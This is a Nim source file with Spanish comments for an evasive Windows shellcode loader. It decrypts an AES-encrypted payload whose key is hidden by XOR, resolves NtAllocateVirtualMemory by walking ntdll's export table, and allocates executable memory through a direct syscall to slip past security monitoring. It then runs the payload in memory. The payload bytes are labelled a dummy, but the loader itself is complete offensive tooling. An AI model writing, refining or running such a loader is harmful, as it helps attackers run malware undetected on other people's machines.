import winim
import strutils

# Importar strcmp desde la biblioteca de C
proc strcmp(a: cstring, b: cstring): cint {.importc, header: "<string.h>".}

# Shellcode cifrado con AES-256 (ejemplo dummy)
var encryptedShellcode: array[16, byte] = [
    0x12'u8, 0x34'u8, 0x56'u8, 0x78'u8, 0x9A'u8, 0xBC'u8, 0xDE'u8, 0xF0'u8,
    0x12'u8, 0x34'u8, 0x56'u8, 0x78'u8, 0x9A'u8, 0xBC'u8, 0xDE'u8, 0xF0'u8
]
# Cambiado a DWORD para coincidir con lo que espera CryptDecrypt
var shellcodeSize: DWORD = len(encryptedShellcode).DWORD

# Clave AES ofuscada con XOR
var obfuscatedKey: array[32, byte] = [
    0x89'u8, 0xAB'u8, 0xCD'u8, 0xEF'u8, 0x46'u8, 0x78'u8, 0x9A'u8, 0xBC'u8,
    0x91'u8, 0xA2'u8, 0xB3'u8, 0xC4'u8, 0xD5'u8, 0xE6'u8, 0xF7'u8, 0x08'u8,
    0x19'u8, 0x2A'u8, 0x3B'u8, 0x4C'u8, 0x5D'u8, 0x6E'u8, 0x7F'u8, 0x80'u8,
    0x29'u8, 0x3A'u8, 0x4B'u8, 0x5C'u8, 0x6D'u8, 0x7E'u8, 0x8F'u8, 0x90'u8
]
let keySize = len(obfuscatedKey).DWORD

# Clave XOR para deofuscación (en lugar de la cadena literal)
var xorKey: array[8, byte] = [0x6F'u8, 0xBF'u8, 0x12'u8, 0xFA'u8, 0x33'u8, 0x7A'u8, 0x22'u8, 0x5C'u8]

# Deofuscación XOR simple
proc XORDeobfuscate(data: ptr BYTE, dataSize: DWORD, key: ptr BYTE, keySize: DWORD) =
    for i in 0..<dataSize.int:
        var currentData = cast[ptr BYTE](cast[uint](data) + i.uint)
        var currentKey = cast[ptr BYTE](cast[uint](key) + (i mod keySize.int).uint)
        currentData[] = currentData[] xor currentKey[]

# Obtener dirección de función desde NTDLL sin usar GetProcAddress
proc GetNativeProcAddress(functionName: cstring): FARPROC =
    let ntdll = GetModuleHandleA("ntdll.dll")
    if ntdll == 0:
        return nil

    let dosHeader = cast[PIMAGE_DOS_HEADER](ntdll)
    let ntHeaders = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdll) + dosHeader.e_lfanew)
    let exportDirectory = cast[PIMAGE_EXPORT_DIRECTORY](cast[DWORD_PTR](ntdll) +
        ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)

    let functions = cast[ptr UncheckedArray[DWORD]](cast[DWORD_PTR](ntdll) + exportDirectory.AddressOfFunctions)
    let names = cast[ptr UncheckedArray[DWORD]](cast[DWORD_PTR](ntdll) + exportDirectory.AddressOfNames)
    let ordinals = cast[ptr UncheckedArray[WORD]](cast[DWORD_PTR](ntdll) + exportDirectory.AddressOfNameOrdinals)

    for i in 0..<exportDirectory.NumberOfNames:
        let currentName = cast[cstring](cast[DWORD_PTR](ntdll) + names[i])
        if strcmp(functionName, currentName) == 0:
            return cast[FARPROC](cast[DWORD_PTR](ntdll) + functions[ordinals[i]])

    return nil

# Syscall stub para NtAllocateVirtualMemory
var syscallId: DWORD = 0

proc NtAllocateVirtualMemorySyscall(
    ProcessHandle: HANDLE,
    BaseAddress: ptr PVOID,
    ZeroBits: ULONG_PTR,
    RegionSize: PSIZE_T,
    AllocationType: ULONG,
    Protect: ULONG
): NTSTATUS {.asmNoStackFrame.} =
    asm """
        mov r10, rcx
        mov eax, `syscallId`
        syscall
        ret
    """

# Descifrado con CryptoAPI
proc DecryptShellcode(): bool =
    var hProv: HCRYPTPROV
    var hKey: HCRYPTKEY
    var success = false

    # Deofuscación de clave
    XORDeobfuscate(obfuscatedKey[0].addr, keySize, xorKey[0].addr, 8.DWORD)

    if CryptAcquireContext(hProv.addr, nil, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) == 0:
        return false

    if CryptImportKey(hProv, obfuscatedKey[0].addr, keySize, 0, 0, hKey.addr) == 0:
        CryptReleaseContext(hProv, 0)
        return false

    var dwMode = CRYPT_MODE_CBC
    CryptSetKeyParam(hKey, KP_MODE, cast[ptr BYTE](dwMode.addr), 0)

    var iv: array[16, byte]
    zeroMem(iv[0].addr, 16)
    CryptSetKeyParam(hKey, KP_IV, iv[0].addr, 0)

    # CORREGIDO: Usamos shellcodeSize que ahora es DWORD
    var tempSize = shellcodeSize
    success = CryptDecrypt(hKey, 0, TRUE, 0, encryptedShellcode[0].addr, &tempSize) != 0
    shellcodeSize = tempSize

    # Limpieza
    zeroMem(obfuscatedKey[0].addr, keySize.int)
    CryptDestroyKey(hKey)
    CryptReleaseContext(hProv, 0)

    return success

when isMainModule:
    # 1. Descifrar shellcode
    if not DecryptShellcode():
        quit(1)

    # 2. Obtener ID de syscall
    let funcAddress = GetNativeProcAddress("NtAllocateVirtualMemory")
    if funcAddress == nil:
        quit(1)
    syscallId = (cast[ptr UncheckedArray[byte]](funcAddress))[4].DWORD

    # 3. Asignar memoria ejecutable
    var memory: PVOID
    var size = shellcodeSize.SIZE_T
    let status = NtAllocateVirtualMemorySyscall(
        GetCurrentProcess(),
        memory.addr,
        0,
        size.addr,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )

    if status != 0:
        quit(1)

    # 4. Copiar y ejecutar
    copyMem(memory, encryptedShellcode[0].addr, shellcodeSize.int)

    # 5. Cambiar permisos a PAGE_EXECUTE_READ
    var oldProtect: DWORD
    if VirtualProtect(memory, shellcodeSize, PAGE_EXECUTE_READ, oldProtect.addr) == 0:
        quit(1)

    # 6. Ejecutar shellcode
    let shellcode = cast[proc() {.nimcall.}](memory)
    shellcode()